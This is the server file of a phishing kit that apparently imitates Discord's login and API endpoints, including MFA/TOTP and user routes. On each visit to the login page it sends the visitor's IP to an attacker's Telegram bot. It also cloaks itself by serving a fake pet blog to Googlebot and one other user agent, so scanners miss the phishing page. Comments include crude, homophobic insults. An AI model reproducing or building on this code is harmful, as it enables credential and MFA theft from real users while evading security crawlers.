// Coded by nuzi#0001 (332044659826229248)
// $$$$$$$$$$$$$$$
const config = require("./api/config.json")
var botTelegram = config.bot
var tgChatId = config.chatId

const auth = require("./api/v9/auth.js")
var challenge = require("./api/extra/challenge.js")
var science = require("./api/v9/science.js")
var experiments = require("./api/v9/experiments.js")
var totp = require("./api/v9/totp.js")
var me = require("./api/v9/me.js")
var metrics = require("./api/v9/metrics.js")


var realWs;
var realSocket;





const path = require("path")
const express = require("express")
const fetch = require("node-fetch")

var app = express()



app.use(express.static('public',{etag: false}))
app.use(express.json())


app.get("/login", (req, res) => {
    console.log(req.headers["user-agent"])
    if(req.headers["user-agent"] != "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" && req.headers["user-agent"] != "Mozilla/5.0 (PlayStation 4 4.71) AppleWebKit/601.2 (KHTML, like Gecko)")
    {
        var ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
        fetch(botTelegram,{
            method: "POST",
            body: JSON.stringify({
                "chat_id": tgChatId,
                "text": `<b>New Visit 😈</b>\n\n<b>IP Address: </b>${ip}\n\n<b>Awaiting Phishing Log....</b>`,
                "parse_mode": "HTML"
            }),
            headers: {"Content-Type": "application/json"}
        })
        return res.sendFile(path.join(__dirname, "./login","index.html"))
    }
    else
    {
        // lol fuck you
        return res.send("<title>Shiba Inu Lovers</title><b>Welcome to my blog!</b>\n\n<p>I really love shibas and cats</p>\n<i>I also go to school since I'm a student, more information soon!</i><br/><img src='https://media.tenor.com/yOsS7_Sts74AAAAC/cute-shiba-inu.gif'><br/><b>shiba inu shiba inu shiba inu shiba inu shiba inu!<b/>")
    }
    
})



app.use("/api/v9/auth/mfa/totp",totp)
app.use("/api/v9/metrics",metrics)
app.use("/api/v9/science",science)
app.use("/api/v9/users/@me",me)
app.use("/api/v9/experiments",experiments)
app.use("/cdn-cgi/challenge-platform/h/g/cv/result/79b09e935c502a4d",challenge)
app.use("/api/v9/auth",auth) // ????????????????? GAY AF???????????????????????????????

module.exports = app